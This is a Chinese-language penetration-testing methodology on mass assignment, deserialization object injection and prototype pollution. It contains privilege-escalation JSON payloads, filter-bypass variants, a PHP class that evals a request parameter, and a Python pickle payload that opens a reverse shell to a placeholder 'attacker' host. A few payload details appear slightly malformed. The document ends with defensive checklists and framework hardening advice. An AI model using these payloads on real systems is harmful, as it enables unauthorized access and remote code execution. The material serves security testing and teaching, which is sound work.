# 对象注入与批量赋值攻击方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化、可复现的对象注入与批量赋值（Object Injection & Mass Assignment）攻击测试与利用流程。通过本方法论，测试人员能够系统性地检测和利用因动态对象属性修改、反序列化对象注入、原型污染等导致的完整性漏洞。

## 1.2 适用范围

本文档适用于以下场景：
- 使用 MVC 框架的 Web 应用（Ruby on Rails、Spring MVC、ASP.NET MVC）
- 使用动态对象属性的 JavaScript/Node.js 应用
- 使用 PHP 反序列化的应用
- 使用 Python pickle/YAML 反序列化的应用
- 使用 Ruby YAML 反序列化的应用
- API 接口接收 JSON/XML 对象数据
- 表单处理和数据绑定功能

## 1.3 读者对象

本文档主要面向：
- 执行渗透测试任务的安全工程师
- 进行代码审计的安全分析师
- 负责应用安全开发的技术人员
- 安全研究人员

---

# 第二部分：核心渗透技术专题

## 专题一：对象注入与批量赋值攻击

### 2.1 技术介绍

对象注入与批量赋值攻击是指利用应用动态设置对象属性的功能，通过修改输入参数来设置非预期的属性，从而绕过访问控制、修改敏感数据或执行未授权操作。

**CWE 映射：**
| CWE 编号 | 描述 |
|---------|------|
| CWE-915 | 动态确定对象属性的不当控制修改 |
| CWE-502 | 不可信数据的反序列化 |
| CWE-1321 | 对象原型属性的不当控制修改（原型污染） |
| CWE-426 | 不可信搜索路径 |
| CWE-427 | 不受控的搜索路径元素 |

**攻击原理：**
- **批量赋值（Mass Assignment）**：框架自动将请求参数绑定到对象属性，攻击者可添加额外参数修改非预期属性
- **对象注入（Object Injection）**：反序列化不可信数据，导致对象属性被恶意修改
- **原型污染（Prototype Pollution）**：JavaScript 中通过 `__proto__` 等属性修改对象原型，影响所有继承对象

**本质：** 应用未正确控制哪些属性可以被外部输入修改，违背了"最小权限"和"白名单"原则。

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **用户资料更新** | 修改个人信息、密码 | 可修改 `is_admin`、`role` 等权限属性 |
| **订单处理** | 创建订单、支付 | 可修改 `price`、`status`、`paid` 等属性 |
| **内容管理** | 发布文章、审核内容 | 可修改 `is_published`、`is_approved` 等属性 |
| **API 接口** | RESTful API 数据操作 | JSON 参数可绑定到任意属性 |
| **表单提交** | 注册表单、配置表单 | 额外参数可修改非预期字段 |
| **文件上传** | 上传配置文件 | 反序列化导致对象注入 |
| **Cookie/Session** | 用户状态存储 | 序列化数据可被篡改 |
| **JavaScript 应用** | 前端对象操作 | 原型污染影响全局对象 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**批量赋值探测：**

1. **识别框架类型**
   ```bash
   # 通过响应头、错误信息等识别框架
   # Ruby on Rails: X-Powered-By: Phusion Passenger
   # Spring MVC: 特定错误格式
   # ASP.NET: X-AspNet-Version 头
   ```

2. **测试参数绑定**
   ```bash
   # 基础测试：添加常见权限参数
   POST /api/user/123/update
   {
     "username": "test",
     "is_admin": true,
     "role": "admin",
     "admin_flag": 1,
     "is_verified": true,
     "internal_role": "superuser"
   }

   # 测试响应，检查属性是否被修改
   ```

3. **探测内部属性**
   ```bash
   # 尝试修改常见内部属性
   POST /api/profile/update
   {
     "email": "test@test.com",
     "_is_admin": true,
     "__admin": true,
     "admin_": true,
     "user_type": "admin",
     "account_status": "active",
     "email_verified": true
   }
   ```

4. **测试数组/嵌套参数**
   ```bash
   # 某些框架支持数组/嵌套参数绑定
   POST /api/user/update
   {
     "user": {
       "username": "test",
       "role": "admin"
     }
   }

   # 或
   POST /api/user/update
   {
     "user[username]": "test",
     "user[role]": "admin"
   }
   ```

#### 2.3.2 白盒测试

**代码审计要点：**

1. **Ruby on Rails 审计**
   ```ruby
   # 危险模式：无 attr_accessible/attr_protected
   class User < ActiveRecord::Base
     # 所有属性都可批量赋值
   end

   # 安全模式：使用强参数
   def update
     @user.update(user_params)
   end

   private
   def user_params
     params.require(:user).permit(:username, :email) # 白名单
   end
   ```

2. **Spring MVC 审计**
   ```java
   // 危险模式：直接绑定到对象
   @RequestMapping("/update")
   public String update(User user) {
       // 所有属性都可被绑定
   }

   // 安全模式：使用 DTO 或 @InitBinder
   @InitBinder
   public void initBinder(WebDataBinder binder) {
       binder.setAllowedFields("username", "email");
   }
   ```

3. **ASP.NET MVC 审计**
   ```csharp
   // 危险模式：绑定到实体
   public ActionResult Update(User user) {
       // 所有属性都可被绑定
   }

   // 安全模式：使用 [Bind] 属性
   public ActionResult Update(
       [Bind(Include = "Username,Email")] User user) {
   }
   ```

4. **JavaScript 原型污染审计**
   ```javascript
   // 危险模式：无过滤的属性设置
   function setValueByPath(obj, path, value) {
       const pathArray = path.split(".");
       const attributeToSet = pathArray.pop();
       let objectToModify = obj;
       for (const attr of pathArray) {
           // 无 __proto__ 检查
           if (typeof objectToModify[attr] !== "object") {
               objectToModify[attr] = {};
           }
           objectToModify = objectToModify[attr];
       }
       objectToModify[attributeToSet] = value;
   }

   // 安全模式：黑名单过滤
   function setValueByPath(obj, path, value) {
       const pathArray = path.split(".");
       const attributeToSet = pathArray.pop();
       let objectToModify = obj;
       for (const attr of pathArray) {
           // 黑名单过滤
           if (attr === "__proto__" || attr === "constructor" || attr === "prototype") {
               continue;
           }
           if (typeof objectToModify[attr] !== "object") {
               objectToModify[attr] = {};
           }
           objectToModify = objectToModify[attr];
       }
       objectToModify[attributeToSet] = value;
   }
   ```

### 2.4 漏洞利用方法

#### 2.4.1 Ruby on Rails 批量赋值攻击

**攻击步骤：**

**步骤 1：识别可绑定参数**
```bash
# 测试常见权限参数
curl -X POST https://target.com/users/123 \
  -H "Content-Type: application/json" \
  -d '{
    "user": {
      "username": "test",
      "is_admin": true,
      "role": "admin",
      "admin": true
    }
  }'
```

**步骤 2：验证权限提升**
```bash
# 检查响应确认属性被修改
# 或以新权限访问受保护资源
curl -H "Cookie: session=xxx" https://target.com/admin
```

**步骤 3：利用 YAML 反序列化（旧版本 Rails）**
```bash
# CVE-2013-0277: Rails YAML 反序列化漏洞
# 构造恶意 YAML 执行任意代码

cat > exploit.yml << EOF
--- !ruby/object:Gem::Installer
i: x
EOF

curl -X POST https://target.com/exploit \
  -H "Content-Type: application/x-yaml" \
  --data-binary @exploit.yml
```

#### 2.4.2 Spring MVC 批量赋值攻击

**攻击步骤：**

```bash
# 测试 Spring MVC 参数绑定
POST /api/user/update HTTP/1.1
Content-Type: application/json

{
  "username": "test",
  "role": "ROLE_ADMIN",
  "enabled": true,
  "authorities": [{"authority": "ROLE_ADMIN"}]
}

# 或测试嵌套属性
{
  "user": {
    "username": "test",
    "role": "admin"
  }
}
```

#### 2.4.3 PHP 对象注入攻击

**攻击步骤：**

**步骤 1：识别反序列化点**
```bash
# 检查 Cookie、POST 参数中的序列化数据
# PHP 序列化特征：O:<长度>:"<类名>"

Cookie: user=O:4:"User":2:{s:8:"username";s:4:"test";s:4:"role";s:5:"admin";}
```

**步骤 2：构造恶意序列化数据**
```php
// 寻找有 __wakeup() 或 __destruct() 魔术方法的类
class MaliciousUser {
    public $role = "admin";
    
    public function __wakeup() {
        // 执行恶意操作
        eval($_GET['cmd']);
    }
}

// 生成序列化数据
$payload = serialize(new MaliciousUser());
echo base64_encode($payload);
```

**步骤 3：发送 Payload**
```bash
curl -H "Cookie: user=O:13:MaliciousUser:1:{s:4:role;s:5:admin;}" \
     https://target.com/
```

#### 2.4.4 JavaScript 原型污染攻击

**攻击步骤：**

**步骤 1：识别原型污染点**
```javascript
// 查找使用 _.set、setValueByPath 等函数的代码
// 或递归合并对象的代码

// 常见污染点：
// - lodash.set
// - merge 函数
// - cloneDeep 函数
```

**步骤 2：构造污染 Payload**
```json
// 通过 JSON 接口污染原型
POST /api/data
{
  "__proto__": {
    "isAdmin": true,
    "role": "admin"
  }
}

// 或通过 URL 参数
GET /api/data?__proto__[isAdmin]=true
```

**步骤 3：验证污染效果**
```javascript
// 污染后，所有对象都继承被污染的属性
const obj = {};
console.log(obj.isAdmin); // true
```

**步骤 4：利用污染提权**
```javascript
// 如果应用检查 obj.isAdmin 进行权限控制
// 污染后可绕过权限检查
```

#### 2.4.5 Python 反序列化攻击

**攻击步骤：**

```python
# 使用 pickle 进行对象注入
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)

# 发送 Payload
# Cookie: session=<payload>
```

#### 2.4.6 信息收集命令

```bash
# 识别框架类型
curl -I https://target.com

# 测试参数绑定
curl -X POST https://target.com/api/update \
  -H "Content-Type: application/json" \
  -d '{"username":"test","is_admin":true}'

# 检查序列化数据
curl -H "Cookie: session=xxx" https://target.com

# 测试原型污染
curl "https://target.com/api/data?__proto__[isAdmin]=true"
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过参数过滤

**方法 1：使用不同参数名**
```bash
# 如果 is_admin 被过滤
{"admin": true}
{"isadmin": true}
{"isAdmin": true}
{"_is_admin": true}
{"admin_flag": true}
```

**方法 2：嵌套参数**
```bash
# 如果顶层参数被过滤
{"user": {"is_admin": true}}
{"data": {"role": "admin"}}
```

**方法 3：数组参数**
```bash
# 某些框架数组参数处理不同
{"roles[]": "admin"}
{"roles[0]": "admin"}
```

#### 2.5.2 绕过白名单

**方法 1：利用白名单缺陷**
```bash
# 如果白名单检查不严格
# 尝试大小写变体、空格等
{"Is_Admin": true}
{"is_admin ": true}
```

**方法 2：利用继承/原型链**
```javascript
// 如果直接属性被保护
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

#### 2.5.3 绕过输入验证

**方法 1：类型混淆**
```bash
# 如果期望字符串但接受其他类型
{"role": "admin"}      # 字符串
{"role": ["admin"]}    # 数组
{"role": {"name": "admin"}}  # 对象
```

**方法 2：编码绕过**
```bash
# URL 编码、Base64 编码等
{"role": "%61%64%6d%69%6e"}  # URL 编码的 "admin"
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | 目标 | Payload 示例 | 说明 |
|-----|------|------------|------|
| **批量赋值** | 权限提升 | `{"is_admin": true, "role": "admin"}` | 修改权限属性 |
| **批量赋值** | 状态修改 | `{"is_verified": true, "account_status": "active"}` | 修改账户状态 |
| **原型污染** | JavaScript | `{"__proto__": {"isAdmin": true}}` | 污染对象原型 |
| **PHP 注入** | Cookie | `O:4:"User":1:{s:4:"role";s:5:"admin";}` | PHP 序列化 |
| **Python 注入** | Pickle | `gASV...` (Base64 pickle) | Pickle 反序列化 |
| **Ruby 注入** | YAML | `--- !ruby/object:Gem::Installer` | YAML 反序列化 |

## 3.2 框架特定风险

| 框架 | 风险点 | 安全配置 |
|-----|--------|---------|
| **Ruby on Rails** | 批量赋值、YAML 反序列化 | 使用强参数、SafeYAML |
| **Spring MVC** | 参数绑定、反序列化 | @InitBinder 白名单 |
| **ASP.NET MVC** | 模型绑定 | [Bind] 属性 |
| **Laravel** | 批量赋值 | $fillable/$guarded |
| **Django** | 模型表单 | fields 白名单 |
| **Express.js** | 原型污染 | 过滤 __proto__ |
| **PHP** | 反序列化 | 避免 unserialize() |

## 3.3 对象注入检查清单

- [ ] 所有用户输入有服务端验证
- [ ] 批量赋值使用白名单
- [ ] 反序列化有类白名单
- [ ] 原型污染有过滤
- [ ] 内部属性不可外部修改
- [ ] 权限属性有额外验证
- [ ] 序列化数据有签名
- [ ] 框架安全配置已启用

## 3.4 防御建议

1. **白名单机制**：使用框架的白名单功能指定允许修改的属性
2. **DTO 模式**：使用数据传输对象而非直接绑定到实体
3. **输入验证**：对外部输入进行严格的类型和值验证
4. **避免反序列化**：使用 JSON 等安全格式替代原生序列化
5. **原型保护**：JavaScript 中过滤 `__proto__`、`constructor`、`prototype`
6. **签名验证**：对序列化数据使用签名确保完整性
7. **最小权限**：对象属性按需暴露，默认不公开
8. **代码审查**：定期审查对象绑定和反序列化代码

---

**参考资源：**
- [OWASP Mass Assignment](https://owasp.org/www-community/Security_Controls_by_Technology_Implementation)
- [OWASP Prototype Pollution](https://owasp.org/www-community/vulnerabilities/Prototype_Pollution)
- [CWE-915](https://cwe.mitre.org/data/definitions/915.html)
- [CWE-502](https://cwe.mitre.org/data/definitions/502.html)
- [CWE-1321](https://cwe.mitre.org/data/definitions/1321.html)
